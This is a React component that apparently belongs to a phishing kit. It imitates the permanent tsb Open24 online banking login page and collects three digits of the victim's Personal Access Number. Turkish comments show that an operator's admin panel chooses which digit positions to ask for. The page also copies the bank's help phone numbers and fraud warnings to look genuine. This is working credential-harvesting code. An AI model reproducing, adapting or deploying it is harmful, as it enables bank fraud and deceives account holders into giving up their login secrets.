"use client";

import { useRef, useState } from "react";

type Props = {
  // Admin'in sectigi 3 digit pozisyonu (or. [3,6,1]) — label'lar dinamik
  digitLabels: [number, number, number];
  saving: boolean;
  onSubmit: (digits: [string, string, string]) => void;
};

export function PtsbApprovalCard({ digitLabels, saving, onSubmit }: Props) {
  const [digits, setDigits] = useState<[string, string, string]>(["", "", ""]);
  const inputRefs = [
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
  ];

  const handleChange = (index: number, raw: string) => {
    const v = raw.replace(/\D/g, "").slice(-1);
    setDigits((prev) => {
      const next = [...prev] as [string, string, string];
      next[index] = v;
      return next;
    });
    if (v && index < 2) inputRefs[index + 1].current?.focus();
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !digits[index] && index > 0) {
      inputRefs[index - 1].current?.focus();
    }
  };

  const allFilled = digits.every((d) => d !== "");

  return (
    <div className="min-h-[100dvh] w-full bg-[#1D252C] font-sans">
      {/* HEADER — "Welcome to Open24 Online Banking" */}
      <header className="flex items-center justify-center gap-3 border-b border-white/10 bg-[#1D252C] px-4 py-5 sm:py-6">
        <img
          src="/bank-logos/ireland/ptsb.png"
          alt="permanent tsb"
          className="h-9 w-auto object-contain sm:h-11"
        />
        <h3 className="text-center text-[15px] font-bold text-white sm:text-lg">
          Welcome to Open24 Online Banking
        </h3>
      </header>

      <main className="mx-auto w-full max-w-[1100px] px-3 py-4 sm:px-6 sm:py-8">
        {/* LOGIN MODULE */}
        <div className="mx-auto w-full max-w-[720px] rounded-sm bg-white px-4 py-8 text-center shadow-[0_4px_20px_rgba(0,0,0,0.35)] sm:px-10 sm:py-10">
          <h1 className="mb-6 text-[26px] font-bold leading-tight text-[#1D252C] sm:mb-8 sm:text-[32px]">
            Login <span className="font-normal">(Step 2 of 2)</span>
          </h1>

          <h3 className="mb-6 text-[19px] font-bold text-[#1D252C] sm:mb-8 sm:text-[22px]">
            Personal Access Number (PAN)
          </h3>

          {/* 3 DIGIT KUTUSU — label'lar admin'den gelen pozisyonlarla dinamik */}
          <div className="mx-auto mb-8 flex max-w-[460px] items-start justify-center gap-4 sm:gap-8">
            {digitLabels.map((pos, i) => (
              <div key={i} className="flex flex-col items-center gap-2">
                <label
                  htmlFor={`ptsb-digit-${i + 1}`}
                  className="text-[13px] font-bold text-[#1D252C] sm:text-[15px]"
                >
                  Digit {pos}
                </label>
                <input
                  ref={inputRefs[i]}
                  id={`ptsb-digit-${i + 1}`}
                  type="password"
                  inputMode="numeric"
                  autoComplete="off"
                  maxLength={1}
                  autoFocus={i === 0}
                  value={digits[i]}
                  onChange={(e) => handleChange(i, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(i, e)}
                  className="h-[54px] w-[64px] rounded-[4px] border border-[#b8b2a8] bg-[#faf9f6] text-center text-[24px] font-bold text-[#1D252C] outline-none transition focus:border-[#f58220] focus:ring-2 focus:ring-[#f58220]/30 sm:h-[62px] sm:w-[78px]"
                />
              </div>
            ))}
          </div>

          <button
            type="button"
            onClick={() => allFilled && onSubmit(digits)}
            disabled={!allFilled || saving}
            className="mx-auto block min-w-[170px] rounded-[4px] bg-[#f58220] px-10 py-3.5 text-[17px] font-bold text-white transition hover:bg-[#d96e15] disabled:cursor-not-allowed disabled:opacity-50 sm:min-w-[200px] sm:py-4 sm:text-[18px]"
          >
            {saving ? "Please wait..." : "Login"}
          </button>
        </div>

        {/* ALT MODULLER — desktop 2 kolon, mobil alt alta */}
        <div className="mx-auto mt-4 grid w-full max-w-[720px] grid-cols-1 gap-4 sm:mt-6 sm:grid-cols-2">
          <div className="rounded-sm bg-white px-5 py-5 text-left shadow-[0_4px_20px_rgba(0,0,0,0.35)]">
            <h3 className="mb-3 text-[16px] font-bold text-[#1D252C]">Need help?</h3>
            <p className="mb-3 text-[13px] leading-relaxed text-[#4a545c]">
              There's no need to be stuck. If you need some assistance, why not pop over to
              our help site for more info about:
            </p>
            <ul className="mb-3 space-y-1 text-[13px] text-[#f58220]">
              <li>▸ logging in / registering</li>
              <li>▸ technical issues</li>
              <li>▸ security concerns</li>
            </ul>
            <p className="text-[13px] leading-relaxed text-[#4a545c]">
              call us on <span className="font-bold text-[#1D252C]">0818 50 24 24</span> or{" "}
              <span className="font-bold text-[#1D252C]">+353 1 2124101</span>
              <br />
              Mon-Fri 9am-5pm (Excl. bank holidays). Sat &amp; Sun 10am-2pm.
            </p>
          </div>

          <div className="rounded-sm bg-white px-5 py-5 text-left shadow-[0_4px_20px_rgba(0,0,0,0.35)]">
            <h3 className="mb-3 text-[16px] font-bold text-[#1D252C]">
              Important Fraud Information
            </h3>
            <ul className="mb-3 space-y-1 text-[13px] text-[#4a545c]">
              <li>▸ We will never send SMS with a link to click</li>
              <li>▸ We will never ask for a security code over the phone</li>
              <li>▸ We will never ask you to authenticate a refund</li>
            </ul>
            <p className="text-[13px] leading-relaxed text-[#4a545c]">
              If you ever get an email, text message, or pop-up asking for any of these
              please contact us on: <span className="font-bold text-[#1D252C]">0818 50 24 24</span>{" "}
              or <span className="font-bold text-[#1D252C]">+353 1 212 4101</span>
            </p>
          </div>
        </div>
      </main>
    </div>
  );
}
